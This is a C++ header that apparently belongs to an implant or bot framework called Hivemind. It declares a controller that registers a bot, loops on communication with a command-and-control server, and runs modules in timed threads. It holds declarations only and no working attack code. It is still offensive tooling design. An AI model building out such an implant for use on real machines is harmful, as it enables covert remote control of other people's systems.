/** @file logic_controler.hpp
 * @brief Declares functions for the logic controller.
 * @author Im_Adriano
 */
#ifndef HIVEMIND_IMPLANTFRAMEWORK_LIB_INCLUDE_LOGIC_CONTROLLER_HPP_
#define HIVEMIND_IMPLANTFRAMEWORK_LIB_INCLUDE_LOGIC_CONTROLLER_HPP_
#include "module.hpp"
#include "transport.hpp"
#include "debugging.hpp"
#include "comms.hpp"
#include "json.hpp"
#include "hivemind.h"
#include "module_factory.hpp"
#include "transport_factory.hpp"

#include <map>
#include <string>
#include <memory>
#include <boost/thread/thread.hpp>
#include <boost/thread/mutex.hpp>
#include <csignal>

// ######## THIS IS CREATED BY CMAKE ########
#include "all_headers.hpp"
// ##########################################

namespace hivemind_lib {

/**
 * @brief Contains info on a thread.
 */
struct ThreadInfo {
  /**
   * @brief The handle to the thread.
   */
  boost::thread thread;
  /**
   * @brief When the thread was started.
   */
  time_t time_start;
  /**
   * @brief How long in seconds until to wait before timing the thread out.
   */
  long int timeout;
};

/**
 * @brief The "main" of the framework, orchestrates the function of the bot.
 */
class LogicController {
 private:
  /**
   * @brief The method to use for transport
   */
  std::string transport_method_;
  /**
   * @brief Modules this bot can run and where they are located
   */
  std::map<std::string, std::shared_ptr<Module>> modules_;
  /**
   * @brief The transport, used for C&C communications
   */
  std::shared_ptr<Transport> transport_;
  /**
   * @brief Contains the info for this implant.
   */
  ImplantInfo implant_info_;
  /**
   * @brief A list of info about threads running. To be used by the thread manager.
   */
  std::vector<ThreadInfo> thread_infos_;

  /**
   * @brief Function for the thread handler.
   * This handler watches all the threads running and terminates them if they have been running for longer than their timeout.
   * It also joins all threads on completion to clean them up.
   */
  void ThreadHandlerFunc();

  /**
   * @brief Executes the given function in it's own thread.
   * @param mod String of module to run.
   * @param func Function in module to run.
   * @param data Data to send to function, the params for the function.
   * @param action_id Id of the action, used for responding.
   */
  void FuncExecutor(const std::string &mod,
                    const std::string &func,
                    const std::string &data,
                    const std::string &action_id);

  /**
   * @brief Creates a thread for the function to run in.
   * @param mod String of module to run.
   * @param func Function in module to run.
   * @param data Data to send to function, the params for the function.
   * @param action_id Id of the action, used for responding.
   */
  void CreateFuncExecutor(const std::string &mod,
                          const std::string &func,
                          const std::string &data,
                          const std::string &action_id);
  /**
   * @brief Used to store if an error occurs in the logic controller.
   */
  bool error_ = false;

  /**
   * @brief Sets that an error has occured in the controller
   */
  void SetError();

  /**
   * @brief Handler for SIGINT, SIGABRT and SIGTERM
   */
  static void SignalHandler(int);

  /**
   * @brief A flag if the main comm loop should be running.
   */
  static bool running_;

  /**
   * @brief Lock to synchronize access on the thread vector.
   */
  static boost::mutex thread_infos_lock_;

 public:
  /**
   * @brief Constructor for Logic Controller
   */
  LogicController();

  /**
   * @brief Returns if an error has occurred
   * @return bool if the error had occurred
   */
  bool HasError() const;

  /**
   * @brief Start the registration process
   */
  int RegisterBot();

  /**
   * @brief Start the communication with the C&C server, this is an infinite loop.
   */
  void BeginComms();

  /**
   * @brief Add a module to the logic controller.
   * @param module Module to add
   */
  void AddModule(const std::string& module);

  /**
   * @brief Set the transportation method for C&C traffic
   * @param transport The transport method to use
   */
  void SetTransportMethod(const std::string& transport);

  /**
   * @brief Initialize the communication method.
   * @param hostname Host to connect to for C&C
   * @param port Port, optional for some transports, to connect to for C&C
   */
  void InitComms(const std::string &hostname, const std::string &port = "");
};
}
#endif
